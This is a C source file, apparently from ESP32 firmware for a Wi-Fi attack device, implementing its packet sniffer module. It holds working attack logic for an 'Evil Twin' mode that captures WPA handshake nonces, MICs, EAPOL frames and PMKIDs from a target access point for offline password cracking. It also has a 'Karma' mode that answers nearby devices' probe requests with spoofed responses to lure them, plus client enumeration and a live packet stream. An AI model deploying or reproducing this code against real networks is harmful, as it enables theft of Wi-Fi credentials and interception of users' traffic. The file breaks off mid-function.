#include <string.h>
#include <esp_wifi.h>
#include <esp_log.h>
#include <esp_timer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <cJSON.h>
#include "wifi_attacks.h"
#include "sniffer.h"
#include "libwifi_extension.h"
#include "wifiMng.h"
#include "utils.h"
#include "target.h"
#include "server_api.h"

#define BEACON_RX_TIMEOUT_MS 5000
#define HANDSHAKE_TIMEOUT_MS 5000

static const char *TAG = "SNIFFER";

/* Tasks Priority and queue len */
#define BEACON_TRACK_TASK_PRIO              10
#define PACKET_PARSING_TASK_PRIO            5
#define PACKET_QUEUE_LEN                    50
#define CHANNEL_HOPPING_TASK_PRIO           3
#define SINGLE_CHANNEL_HOPPING_TASK_PRIO    3

/* Queue and semaphore */
static QueueHandle_t packet_queue = NULL;
static SemaphoreHandle_t clients_semaphore = NULL;
static SemaphoreHandle_t target_semaphore = NULL;
static SemaphoreHandle_t aps_semaphore = NULL;

/* Tasks handlers */
static TimerHandle_t beacon_track_timer_handle = NULL;
static TaskHandle_t beacon_track_task_handle = NULL;
static TaskHandle_t packet_parsing_task_handle = NULL;
static TaskHandle_t channel_hopping_task_handle = NULL;
static TaskHandle_t single_channel_hopping_task_handle = NULL;

/* Group Bits */
#define SCAN_DONE_BIT (1<<0)
static EventGroupHandle_t scan_evt = NULL;
static esp_event_handler_instance_t scan_done_event_instance = NULL;

/* Client and target info */
static clients_t clients = {0};
static handshake_info_t handshake_info = {0};
static probe_request_list_t captured_probes = {0};
static aps_info_t detected_aps = {0};

/* Global target pointer */
static target_info_t *target = NULL;

/* Current sniffer mode */
static sniffer_mode_t current_sniff_mode = SNIFF_MODE_IDLE;

/* Filters for promiscous mode */
static int filter_type_main = 0;      // 0=All, 1=Mgmt, 2=Ctrl, 3=Data
static uint32_t filter_subtype_mask = 0; // Maschera specifica
static uint8_t filter_channel = 0; // Channel mask

/* Private function */
static void beacon_track_task(void *param);
static void hopping_timer_callback(TimerHandle_t xTimer);
static void add_client_to_list(const uint8_t *mac, const uint8_t *bssid);
static void wifi_sniffer_channel_hopping_task(void *param);
static void wifi_sniffer_single_channel_hopping_task(void *param);


static void wifi_event_scan_done_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data)
{
    if(event_base != WIFI_EVENT) return;
    if (event_id == WIFI_EVENT_SCAN_DONE) 
    {
        xEventGroupSetBits(scan_evt, SCAN_DONE_BIT);
    }
}


IRAM_ATTR static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;

    if (packet_queue == NULL)
    {
        return; // Queue not initialized
    }

    if (packet->rx_ctrl.sig_len == 0 || packet->rx_ctrl.sig_len > PACKET_MAX_PAYLOAD_LEN)
    {
        return;
    }

    sniffer_packet_t sniffer_pkt;
    sniffer_pkt.length = packet->rx_ctrl.sig_len;
    sniffer_pkt.rssi = packet->rx_ctrl.rssi;
    sniffer_pkt.channel = packet->rx_ctrl.channel;
    memcpy(sniffer_pkt.payload, packet->payload, sniffer_pkt.length);

    BaseType_t xHigherPriorityTaskWoken = pdFALSE;
    if( xQueueSendFromISR(packet_queue, &sniffer_pkt, &xHigherPriorityTaskWoken) != pdTRUE ) {

    }
    if (xHigherPriorityTaskWoken)
    {
        portYIELD_FROM_ISR();
    }
}


/** 
 * @brief Handler for Global Monitor mode packet parsing
 * 
 * @param frame 
 */
static void handle_global_monitor(struct libwifi_frame *frame, sniffer_packet_t *sniffer_pkt)
{
    // Scan for client associated with APs
    if (frame->frame_control.type == TYPE_DATA)
    {
        uint8_t to_ds = frame->frame_control.flags.to_ds;
        uint8_t from_ds = frame->frame_control.flags.from_ds;
        const uint8_t *addr1 = (uint8_t *)&frame->header.data.addr1;
        const uint8_t *addr2 = (uint8_t *)&frame->header.data.addr2;

        // Caso 1: Client invia all'AP (ToDS=1, FromDS=0)
        // Addr1 = BSSID (Dest), Addr2 = Client (Src)
        if (to_ds == 1 && from_ds == 0) {
            add_client_to_list(addr2, addr1); // Client, AP
        }
        // Caso 2: AP invia al Client (ToDS=0, FromDS=1)
        // Addr1 = Client (Dest), Addr2 = BSSID (Src)
        else if (to_ds == 0 && from_ds == 1) {
            add_client_to_list(addr1, addr2); // Client, AP
        }
    }
}


/** 
 * @brief Handler for Target Only mode packet parsing
 * 
 * @param frame 
 */
static void handle_target_monitor(struct libwifi_frame *frame)
{
    if (target == NULL)
        return;

    const uint8_t *dest = (uint8_t *)&frame->header.mgmt_ordered.addr1;
    const uint8_t *src = (uint8_t *)&frame->header.mgmt_ordered.addr2;
    const uint8_t *bssid = (uint8_t *)&frame->header.mgmt_ordered.addr3;

    // Filtra RIGIDAMENTE solo ciò che riguarda il target
    if (isMacEqual(bssid, target->bssid) || isMacEqual(src, target->bssid) || isMacEqual(dest, target->bssid))
    {
        // 1. Aggiungi client alla lista (se è un client che parla col target)
        if (!isMacEqual(src, target->bssid) && frame->frame_control.type == TYPE_DATA)
        {
            add_client_to_list(src, target->bssid);
        }

        // 2. Cerca Handshake / PMKID (solo se non li abbiamo già)
        if (!handshake_info.handshake_captured)
        {
            // ... Tua logica di estrazione EAPOL / Handshake qui ...
            // Questa è la parte "sicura": guardi ma non tocchi (no deauth)
        }
    }
}


/** 
 * @brief Handler for Karma attack probe requests parsing
 * 
 * @param frame 
 * @param sniffer_pkt 
 */
static void handle_karma_attack(struct libwifi_frame *frame, sniffer_packet_t *sniffer_pkt)
{
    if (frame == NULL) return;

    if (frame->frame_control.type == TYPE_MANAGEMENT && frame->frame_control.subtype == SUBTYPE_PROBE_REQ)
    {
        struct libwifi_sta probe_req_info = {0};
        if (libwifi_parse_probe_req(&probe_req_info, frame) == 0)
        {
            if(strlen(probe_req_info.ssid) == 0) {
                goto cleanup;
            }
            const uint8_t *src_mac = (uint8_t *)frame->header.mgmt_ordered.addr2;
            /* Check if this is a new probe request */
            for (int i = 0; i < captured_probes.num_probes; i++) {
                if (memcmp(captured_probes.probes[i].mac, src_mac, 6) == 0 && strcmp(captured_probes.probes[i].ssid, probe_req_info.ssid) == 0) {
                    captured_probes.probes[i].rssi = sniffer_pkt->rssi;
                    captured_probes.probes[i].channel = sniffer_pkt->channel;
                    wifi_attack_send_karma_probe_response(src_mac, probe_req_info.ssid, sniffer_pkt->channel);
                    goto cleanup;
                }
            }
            /* New Probe Request */
            if (captured_probes.num_probes < MAX_PROBE_REQ) {
                memcpy(captured_probes.probes[captured_probes.num_probes].mac, src_mac, 6);
                strncpy(captured_probes.probes[captured_probes.num_probes].ssid, probe_req_info.ssid, 32);
                captured_probes.probes[captured_probes.num_probes].rssi = sniffer_pkt->rssi;
                captured_probes.probes[captured_probes.num_probes].channel = sniffer_pkt->channel;
                wifi_attack_send_karma_probe_response(src_mac, probe_req_info.ssid, sniffer_pkt->channel);
                captured_probes.num_probes++;
                ESP_LOGI(TAG, "New Probe: %s from %02x:%02x...", probe_req_info.ssid, src_mac[0], src_mac[1]);
            }
        cleanup:
            libwifi_free_sta(&probe_req_info);
        }
    }
}


/** 
 * @brief Handler for Evil Twin attack (Handshake capture and CSA handling)
 * 
 * @param frame 
 * @param sniffer_pkt 
 */
static void handle_evil_twin(struct libwifi_frame *frame, sniffer_packet_t *sniffer_pkt)
{
    if (frame == NULL || target == NULL)
        return;

    static uint32_t last_m1_timestamp = 0;
    static uint64_t temp_replay_counter = 0;

    /* For better reading */
    const uint8_t *dest_mac = (uint8_t *)&frame->header.mgmt_ordered.addr1; // Destination MAC address
    const uint8_t *src_mac = (uint8_t *)&frame->header.mgmt_ordered.addr2;  // Source MAC address
    const uint8_t *bssid = (uint8_t *)&frame->header.mgmt_ordered.addr3;    // BSSID

    struct libwifi_wpa_auth_data wpa_data = {0};
    bool wpa_data_initialized = false;

    /* Check frame type data for EAPOLs */
    if (frame->frame_control.type == TYPE_DATA)
    {
        if (isMacEqual(bssid, target->bssid) || isMacEqual(src_mac, target->bssid) || isMacEqual(dest_mac, target->bssid))
        {
            /* Add client to the list if MAC matches the target */
            if (!isMacEqual(src_mac, target->bssid))
            {
                add_client_to_list(src_mac, target->bssid);
            }
            /* Check if handshake or pmkid already captured */
            if (handshake_info.handshake_captured || handshake_info.pmkid_captured)
            {
                goto cleanup;
            }
            /* Timeout reset if M1 is received but no M2 for HANDSHAKE_TIMEOUT_MS */
            if (!isMacZero(handshake_info.mac_sta) && (pdTICKS_TO_MS(xTaskGetTickCount()) - last_m1_timestamp > HANDSHAKE_TIMEOUT_MS))
            {
                ESP_LOGD(TAG, "Handshake M1 timeout, resetting state");
                memset(handshake_info.mac_sta, 0, 6);
                temp_replay_counter = 0;
            }
            /* Check for WPA Handshake frames */
            if (libwifi_check_wpa_handshake(frame))
            {
                /* Extract WPA data from the frame */
                int ret = libwifi_get_wpa_data(frame, &wpa_data);
                if (ret != 0)
                {
                    goto cleanup;
                }
                wpa_data_initialized = true;
                int msg_type = libwifi_check_wpa_message(frame);

                /* M1 Message */
                if (msg_type == HANDSHAKE_M1 && isMacEqual(src_mac, target->bssid))
                {
                    // Se non stiamo tracciando nessuno O stiamo tracciando questo specifico client (ritrasmissione M1)
                    if (isMacZero(handshake_info.mac_sta) || isMacEqual(handshake_info.mac_sta, dest_mac))
                    {
                        /* Extract ANonce from MSG 1 */
                        memcpy(handshake_info.anonce, wpa_data.key_info.nonce, 32);
                        memcpy(handshake_info.mac_sta, dest_mac, 6);
                        /* Get key desccriptor version */
                        handshake_info.key_decriptor_version = wpa_data.key_info.information & 0x0003;
                        temp_replay_counter = wpa_data.key_info.replay_counter;
                        last_m1_timestamp = pdTICKS_TO_MS(xTaskGetTickCount());

                        /* Try get PMKID */
                        /* Minimum length for RSNIE with PMKID */
                        if (!handshake_info.pmkid_captured && wpa_data.key_info.key_data_length >= 20)
                        {
                            struct libwifi_tag_iterator iterator = {0};
                            if (libwifi_tag_iterator_init(&iterator, wpa_data.key_info.key_data, wpa_data.key_info.key_data_length) == 0)
                            {
                                const uint8_t *tag_data = iterator.tag_data;
                                /* Check WPA OUI */
                                if (tag_data[0] == 0x00 && tag_data[1] == 0x0F && tag_data[2] == 0xAC)
                                {
                                    memcpy(handshake_info.pmkid, tag_data + 4, 16);
                                    handshake_info.pmkid_captured = true;
                                    ESP_LOGI(TAG, "PMKID Captured!");
                                }
                            }
                        }
                    }
                }
                /* M2 Message */
                else if (msg_type == HANDSHAKE_M2 && isMacEqual(src_mac, handshake_info.mac_sta))
                {
                    if (temp_replay_counter != wpa_data.key_info.replay_counter)
                    {
                        ESP_LOGD(TAG, "Received M2 with different replay counter, ignoring.");
                        goto cleanup;
                    }
                    /* Extract SNonce and MIC from MSG 2 */
                    memcpy(handshake_info.snonce, wpa_data.key_info.nonce, 32);
                    memcpy(handshake_info.mic, wpa_data.key_info.mic, 16);

                    uint16_t raw_len = 0;
                    uint8_t *raw_ptr = find_eapol_frame(sniffer_pkt->payload, sniffer_pkt->length, &raw_len);
                    if (raw_ptr && raw_len <= sizeof(handshake_info.eapol))
                    {
                        memcpy(handshake_info.eapol, raw_ptr, raw_len);
                        handshake_info.eapol_len = raw_len;

                        if (handshake_info.eapol_len > 81 + 16)
                        {
                            memset(handshake_info.eapol + 81, 0, 16);
                        }

                        handshake_info.handshake_captured = true;
                        ESP_LOGI(TAG, "Handshake Captured (M1+M2)!");
                    }
                }
            }
        }
    }
    /* Check for management frames */
    else if (frame->frame_control.type == TYPE_MANAGEMENT)
    {
        /* Capture beacon frames */
        if (frame->frame_control.subtype == SUBTYPE_BEACON)
        {
            if (isMacBroadcast(dest_mac) == true && isMacEqual(src_mac, target->bssid))
            {
                /* Reset beacon timeout timer */
                if (beacon_track_timer_handle != NULL)
                {
                    xTimerReset(beacon_track_timer_handle, 0);
                }
                struct libwifi_bss bss = {0};
                if (libwifi_parse_beacon(&bss, frame) == 0)
                {
                    csa_event_t csa;
                    if (libwifi_extract_csa(&bss, &csa))
                    {
                        ESP_LOGI(TAG, "BEACON: CSA detected from target AP, new_channel=%u count=%u", csa.new_channel, csa.count);
                        if (csa.count <= 1)
                            wifi_set_channel_safe(csa.new_channel);
                    }
                    libwifi_free_bss(&bss);
                }
            }
        }
        /* Capture probe response frames */
        if (frame->frame_control.subtype == SUBTYPE_PROBE_RESP)
        {
            if (isMacEqual(src_mac, target->bssid))
            {
                struct libwifi_bss bss = {0};
                if (libwifi_parse_probe_resp(&bss, frame) == 0)
                {
                    csa_event_t csa;
                    if (libwifi_extract_csa(&bss, &csa))
                    {
                        ESP_LOGI(TAG, "PROBE_RESP: CSA detected from target AP, new_channel=%u count=%u", csa.new_channel, csa.count);
                        if (csa.count <= 1)
                            wifi_set_channel_safe(csa.new_channel);
                    }
                    libwifi_free_bss(&bss);
                }
            }
        }
        /* Capture action frames */
        else if (frame->frame_control.subtype == SUBTYPE_ACTION)
        {
            csa_event_t csa;
            if (libwifi_extract_csa_from_action_frame(frame, &csa))
            {
                ESP_LOGI(TAG, "ACTION_FRAME: CSA detected from target AP, new_channel=%u count=%u", csa.new_channel, csa.count);
                if (csa.count <= 1)
                    wifi_set_channel_safe(csa.new_channel);
            }
        }
    }

cleanup:
    /* Cleanup allocated resources */
    if (wpa_data_initialized)
    {
        libwifi_free_wpa_data(&wpa_data);
    }
}


/** 
 * @brief Handler for Live Packet Analyzer
 * 
 * @param frame 
 * @param sniffer_pkt 
 */
static void handle_raw_view(struct libwifi_frame *frame, sniffer_packet_t *sniffer_pkt)
{
    if(sniffer_pkt->channel != filter_channel && filter_channel != 0) return;

    struct libwifi_wpa_auth_data wpa_data = {0};

    // Rate Limiting
    static int64_t last_pkt_time = 0;
    if (esp_timer_get_time() - last_pkt_time < 40000) return; 

    uint16_t type = frame->frame_control.type;       
    uint16_t subtype = frame->frame_control.subtype; 

    // --- FILTRAGGIO SOFTWARE (Mgmt / Data) ---
    // Mappatura interna: 0=Mgmt, 1=Ctrl, 2=Data -> Nostri ID menu: 1=Mgmt, 2=Ctrl, 3=Data
    int type_menu_id = -1;
    if (type == TYPE_MANAGEMENT) type_menu_id = 1;
    else if (type == TYPE_CONTROL) type_menu_id = 2;
    else if (type == TYPE_DATA) type_menu_id = 3;

    if (filter_type_main != 0 && filter_type_main != type_menu_id) return; 

    // Filtro Sottotipo (Solo Mgmt e Data)
    if (type_menu_id == 1 || type_menu_id == 3) {
        if (filter_subtype_mask != 0xFFFF) { 
            // filter_subtype_mask dal frontend è (enum << 4)
            if ((subtype << 4) != filter_subtype_mask) return; 
        }
    }
    // Nota: Control (type 2) è filtrato in Hardware via maschera

    last_pkt_time = esp_timer_get_time();

    // --- GENERAZIONE STRINGHE (Basata sulle tue Enum) ---
    char type_str[10] = "UNK";
    char subtype_str[32] = "Unk"; // Aumentato buffer
    char info[64] = "";

    if (type == TYPE_MANAGEMENT) {
        strcpy(type_str, "MGMT");
        switch(subtype) {
            case 0: strcpy(subtype_str, "ASSOC_REQ"); break;
            case 1: strcpy(subtype_str, "ASSOC_RESP"); break;
            case 2: strcpy(subtype_str, "REASSOC_REQ"); break;
            case 3: strcpy(subtype_str, "REASSOC_RESP"); break;
            case 4: 
                strcpy(subtype_str, "PROBE_REQ");
                struct libwifi_sta sta = {0};
                if(libwifi_parse_probe_req(&sta, frame) == 0) {
                    snprintf(info, sizeof(info), "Req: %s", sta.ssid);
                    libwifi_free_sta(&sta);
                }
                break;
            case 5: strcpy(subtype_str, "PROBE_RESP"); break;
            case 6: strcpy(subtype_str, "TIME_ADV"); break;
            case 8: 
                strcpy(subtype_str, "BEACON");
                struct libwifi_bss bss = {0};
                if(libwifi_parse_beacon(&bss, frame) == 0) {
                    snprintf(info, sizeof(info), "SSID: %s", bss.ssid);
                    libwifi_free_bss(&bss);
                }
                break;
            case 9: strcpy(subtype_str, "ATIM"); break;
            case 10: strcpy(subtype_str, "DISASSOC"); break;
            case 11: strcpy(subtype_str, "AUTH"); break;
            case 12: strcpy(subtype_str, "DEAUTH"); break;
            case 13: strcpy(subtype_str, "ACTION"); break;
            case 14: strcpy(subtype_str, "ACTION_NOACK"); break;
            default: snprintf(subtype_str, sizeof(subtype_str), "MGMT_%d", subtype); break;
        }

    } else if (type == TYPE_CONTROL) {
        strcpy(type_str, "CTRL");
        switch(subtype) {
            case 3: strcpy(subtype_str, "TACK"); break;
            case 4: strcpy(subtype_str, "BEAMFORM_POLL"); break;
            case 5: strcpy(subtype_str, "VHT_NDP"); break;
            case 6: strcpy(subtype_str, "CF_EXT"); break;
            case 7: strcpy(subtype_str, "WRAPPER"); break;
            case 8: strcpy(subtype_str, "BLOCK_ACK_REQ"); break;
            case 9: strcpy(subtype_str, "BLOCK_ACK"); break;
            case 10: strcpy(subtype_str, "PS_POLL"); break;
            case 11: strcpy(subtype_str, "RTS"); break;
            case 12: strcpy(subtype_str, "CTS"); break;
            case 13: strcpy(subtype_str, "ACK"); break;
            case 14: strcpy(subtype_str, "CF_END"); break;
            case 15: strcpy(subtype_str, "CF_END+ACK"); break;
            default: snprintf(subtype_str, sizeof(subtype_str), "CTRL_%d", subtype); break;
        }

    } else if (type == TYPE_DATA) {
        strcpy(type_str, "DATA");
        // Check Handshake EAPOL (che è un Data subtype 0 o 8 solitamente)
        if (libwifi_get_wpa_data(frame, &wpa_data) == 0) {
            const char *handshake_message = libwifi_get_wpa_message_string(frame);
            strcpy(type_str, "EAPOL");
            snprintf(subtype_str, sizeof(subtype_str), "Handshake: %s", handshake_message);
            libwifi_free_wpa_data(&wpa_data);
        } else {
            switch(subtype) {
                case 0: strcpy(subtype_str, "DATA"); break;
                case 4: strcpy(subtype_str, "DATA_NULL"); break;
                case 8: strcpy(subtype_str, "QOS_DATA"); break;
                case 9: strcpy(subtype_str, "QOS_DATA_CF_ACK"); break;
                case 10: strcpy(subtype_str, "QOS_DATA_CF_POLL"); break;
                case 11: strcpy(subtype_str, "QOS_DATA_CF_ACK+POLL"); break;
                case 12: strcpy(subtype_str, "QOS_NULL"); break;
                case 14: strcpy(subtype_str, "QOS_CF_POLL"); break;
                case 15: strcpy(subtype_str, "QOS_CF_ACK+POLL"); break;
                default: snprintf(subtype_str, sizeof(subtype_str), "DATA_%d", subtype); break;
            }
        }
    }

    // Indirizzi MAC
    char src[18] = "NA", dst[18] = "NA";
    const uint8_t *a1 = (uint8_t *)&frame->header.data.addr1; 
    const uint8_t *a2 = (uint8_t *)&frame->header.data.addr2; 
    snprintf(dst, sizeof(dst), "%02X:%02X:%02X:%02X:%02X:%02X", a1[0],a1[1],a1[2],a1[3],a1[4],a1[5]);
    snprintf(src, sizeof(src), "%02X:%02X:%02X:%02X:%02X:%02X", a2[0],a2[1],a2[2],a2[3],a2[4],a2[5]);

    // Costruzione JSON
    cJSON *root = cJSON_CreateObject();
    if(!root) return;

    cJSON_AddStringToObject(root, "type", "packet");
    cJSON_AddNumberToObject(root, "ch", sniffer_pkt->channel);
    cJSON_AddNumberToObject(root, "rssi", sniffer_pkt->rssi);
    cJSON_AddNumberToObject(root, "len", sniffer_pkt->length);
    cJSON_AddStringToObject(root, "type_str", type_str);
    cJSON_AddStringToObject(root, "subtype_str", subtype_str);
    cJSON_AddStringToObject(root, "src", src);
    cJSON_AddStringToObject(root, "dst", dst);
    cJSON_AddStringToObject(root, "info", info);

    char *json = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (json) {
        ws_frame_req_t req;
        req.hd = get_web_server_handle();
        req.fd = -1; // Broadcast
        req.payload = json;
        req.len = strlen(json);
        req.need_free = true;
        req.frame_type = WS_TX_FRAME; 
        
        if(ws_send_broadcast_to_queue(&req) != ESP_OK) {
            free(json); 
        }
    }
}


/** 
 * @brief Packet parsing task
 * 
 * @param param 
 */
static void packet_parsing_task(void *param)
{
    sniffer_packet_t sniffer_pkt = {0};

    while (1)
    {
        if (xQueueReceive(packet_queue, &sniffer_pkt, portMAX_DELAY) == pdTRUE)
        {
            struct libwifi_frame frame = {0};
            int ret = libwifi_get_wifi_frame(&frame, (uint8_t *)sniffer_pkt.payload, sniffer_pkt.length, false);

            /* Failed to parse the Wi-Fi frame */
            if (ret != 0)
            {
                #ifdef DEBUG
                ESP_LOGE(TAG, "Failed to parse wifi frame.");
                #endif
                goto cleanup;
            }

            switch (current_sniff_mode)
            {
            case SNIFF_MODE_RAW_VIEW:
                handle_raw_view(&frame, &sniffer_pkt);
                break;

            case SNIFF_MODE_TARGET_ONLY:
                handle_target_monitor(&frame);
                break;

            case SNIFF_MODE_ATTACK_EVIL_TWIN:
                handle_evil_twin(&frame, &sniffer_pkt);
                break;

            case SNIFF_MODE_ATTACK_KARMA:
                handle_karma_attack(&frame, &sniffer_pkt);
                break;

            case SNIFF_MODE_GLOBAL_MONITOR:
                handle_global_monitor(&frame, &sniffer_pkt);
                break;

            case SNIFF_MODE_IDLE:
            default:
                /* Do nothing */
                break;
            }
        cleanup:
            /* Cleanup allocated resources */
            libwifi_free_wifi_frame(&frame);
        }
    }
}


esp_err_t wifi_start_sniffing(target_info_t * _target, sniffer_mode_t mode)
{
    /* Init semaphore */
    if (clients_semaphore == NULL) {
        clients_semaphore = xSemaphoreCreateMutex();
    }
    if (target_semaphore == NULL) {
        target_semaphore = xSemaphoreCreateMutex();
    }
    if (aps_semaphore == NULL) {
        aps_semaphore = xSemaphoreCreateMutex();
    }

    if (_target != NULL)
    {
        xSemaphoreTake(target_semaphore, portMAX_DELAY);
        target = _target;
        xSemaphoreGive(target_semaphore);
    }

    /* Create packet queue */
    if (packet_queue == NULL)
    {
        packet_queue = xQueueCreate(PACKET_QUEUE_LEN, sizeof(sniffer_packet_t));
        if (packet_queue == NULL)
        {
            ESP_LOGE(TAG, "Failed to create packet queue");
            return ESP_FAIL;
        }
    }

    /* Create packet parsing task */
    if (packet_parsing_task_handle == NULL)
    {
        BaseType_t result = xTaskCreate(packet_parsing_task, "packet_parsing_task", 8192, NULL, PACKET_PARSING_TASK_PRIO, &packet_parsing_task_handle);
        if (result != pdPASS)
        {
            ESP_LOGE(TAG, "Failed to create packet parsing task");
            return ESP_FAIL;
        }
    }

    bool en = false;
    ESP_ERROR_CHECK(esp_wifi_get_promiscuous(&en));
    /* Start wifi promiscuos mode */
    if (en == true)
    {
        ESP_LOGW(TAG, "Promiscuous mode already enabled");
        return ESP_ERR_INVALID_STATE;
    }

    /* Reset client count */
    memset(&clients, 0, sizeof(clients_t));
    memset(&handshake_info, 0, sizeof(handshake_info_t));
    memset(&captured_probes, 0, sizeof(probe_request_list_t));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT};
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    filter.filter_mask = 0;
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_ctrl_filter(&filter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(promiscuous_callback));

    if (mode < SNIFF_MODE_IDLE || mode >= SNIFF_MODE_MAX)
    {
        ESP_LOGW(TAG, "Invalid sniffer mode %d", mode);
        return ESP_ERR_INVALID_ARG;
    }
    current_sniff_mode = mode;

    return ESP_OK;
}


esp_err_t wifi_stop_sniffing(void)
{
    bool en = false;
    ESP_ERROR_CHECK(esp_wifi_get_promiscuous(&en));

    wifi_sniffer_stop_single_channel_hopping();
    wifi_sniffer_stop_channel_hopping();

    /* Disable promiscuous mode */
    if (en == true)
    {
        ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    }

    /* Delete packet parsing task */
    if (packet_parsing_task_handle != NULL)
    {
        vTaskDelete(packet_parsing_task_handle);
        packet_parsing_task_handle = NULL;
    }

    /* Delete packet queue */
    if (packet_queue != NULL)
    {
        vQueueDelete(packet_queue);
        packet_queue = NULL;
    }

    /* Delete semaphore */
    if (clients_semaphore != NULL)
    {
        vSemaphoreDelete(clients_semaphore);
        clients_semaphore = NULL;
    }
    if (target_semaphore != NULL)
    {
        vSemaphoreDelete(target_semaphore);
        target_semaphore = NULL;
    }
    if (aps_semaphore != NULL)
    {
        vSemaphoreDelete(aps_semaphore);
        aps_semaphore = NULL;
    }

    target = NULL;
    current_sniff_mode = SNIFF_MODE_IDLE;

    return ESP_OK;
}


void wifi_sniffer_set_fine_filter(int type, uint32_t subtype, uint8_t channel) {
    filter_type_main = type;
    filter_subtype_mask = subtype;
    filter_channel = channel;

    wifi_promiscuous_filter_t filter = {0};
    filter.filter_mask = 0;

    // Reset Ctrl Filter di default (nessun pacchetto control)
    wifi_promiscuous_filter_t ctrl_filter = { .filter_mask = 0 };
    esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter);

    switch(type) {
        case 0: // ALL
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
            // Abilita tutti i control packets se ALL è selezionato (o solo quelli utili per non intasare)
            ctrl_filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
            esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter);
            break;

        case 1: // MANAGEMENT
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
            // Nessun filtro CTRL hardware necessario
            break;

        case 2: // CONTROL
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_CTRL;
            // Qui applichiamo la maschera specifica hardware passata dal frontend!
            // Es. se subtype è (1<<29), passerà solo ACK
            ctrl_filter.filter_mask = subtype;
            esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter);
            break;

        case 3: // DATA
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_DATA_MPDU | WIFI_PROMIS_FILTER_MASK_DATA_AMPDU;
            break;
    }

    // Applica filtro principale
    esp_wifi_set_promiscuous_filter(&filter);
}


void wifi_sniffer_set_mode(sniffer_mode_t mode)
{
    if (mode < SNIFF_MODE_IDLE || mode > SNIFF_MODE_ATTACK_EVIL_TWIN)
    {
        ESP_LOGW(TAG, "Invalid sniffer mode %d", mode);
        return;
    }
    current_sniff_mode = mode;
}


esp_err_t wifi_start_beacon_tracking(void)
{
    /* Start beacon timer for channel tracking */
    if (beacon_track_timer_handle == NULL)
    {
        beacon_track_timer_handle = xTimerCreate("beacon_track_timer", pdMS_TO_TICKS(BEACON_RX_TIMEOUT_MS), pdTRUE, NULL, hopping_timer_callback);
    }

    if (beacon_track_timer_handle == NULL)
    {
        ESP_LOGE(TAG, "Error creating beacon track timer.");
        return ESP_FAIL;
    }

    xTimerStart(beacon_track_timer_handle, 0);
    if (beacon_track_task_handle == NULL)
    {
        xTaskCreate(beacon_track_task, "beacon_track_task_handle", 4096, NULL, BEACON_TRACK_TASK_PRIO, &beacon_track_task_handle);
    }

    return ESP_OK;
}


esp_err_t wifi_stop_beacon_tracking(void)
{
    /* Stop beacon timer for channel tracking */
    if (beacon_track_timer_handle != NULL)
    {
        xTimerStop(beacon_track_timer_handle, 0);
        xTimerDelete(beacon_track_timer_handle, 0);
        beacon_track_timer_handle = NULL;
    }

    /* Stop task for beacon channel tracking */
    if (beacon_track_task_handle != NULL)
    {
        vTaskDelete(beacon_track_task_handle);
        beacon_track_task_handle = NULL;
    }

    return ESP_OK;
}


esp_err_t wifi_sniffer_start_channel_hopping(void)
{
    if (channel_hopping_task_handle == NULL)
    {
        xTaskCreate(wifi_sniffer_channel_hopping_task, "channel_hopping_task", 4096, NULL, CHANNEL_HOPPING_TASK_PRIO, &channel_hopping_task_handle);
    }
    return ESP_OK;
}


esp_err_t wifi_sniffer_stop_channel_hopping(void)
{
    if (channel_hopping_task_handle != NULL)
    {
        vTaskDelete(channel_hopping_task_handle);
        channel_hopping_task_handle = NULL;
    }
    return ESP_OK;
}


esp_err_t wifi_sniffer_start_single_channel_hopping(uint8_t channel)
{
    if(scan_evt == NULL) {
        scan_evt = xEventGroupCreate();
    }
    if(scan_evt == NULL) {
        ESP_LOGE(TAG, "Failed to create event group.");
        return ESP_FAIL;
    }
    if(scan_done_event_instance == NULL) {
        ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, &wifi_event_scan_done_handler, NULL, &scan_done_event_instance));
    }
    if (single_channel_hopping_task_handle == NULL) {
        xTaskCreate(wifi_sniffer_single_channel_hopping_task, "single_channel_hopping_task", 2048, (void*)(uintptr_t)channel, SINGLE_CHANNEL_HOPPING_TASK_PRIO, &single_channel_hopping_task_handle);
    }
    return ESP_OK;
}


esp_err_t wifi_sniffer_stop_single_channel_hopping(void)
{
    if(scan_evt != NULL) {
        vEventGroupDelete(scan_evt);
        scan_evt = NULL;
    }
    if (single_channel_hopping_task_handle != NULL) {
        vTaskDelete(single_channel_hopping_task_handle);
        single_channel_hopping_task_handle = NULL;
    }
    if(scan_done_event_instance != NULL) {
        ESP_ERROR_CHECK(esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, scan_done_event_instance));
        scan_done_event_instance = NULL;
    }
    return ESP_OK;
}


const probe_request_list_t *wifi_sniffer_get_captured_probes(void)
{
    return &captured_probes;
}


const handshake_info_t *wifi_sniffer_get_handshake(void)
{
    return &handshake_info;
}


esp_err_t wifi_sniffer_get_clients(clients_t *out)
{
    if(out == NULL) return ESP_ERR_INVALID_ARG;

    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        memcpy(out, &clients, sizeof(clients_t));
        xSemaphoreGive(clients_semaphore);
        return ESP_OK;
    }
    return ESP_FAIL;
}


esp_err_t wifi_sniffer_get_aps(aps_info_t *out)
{
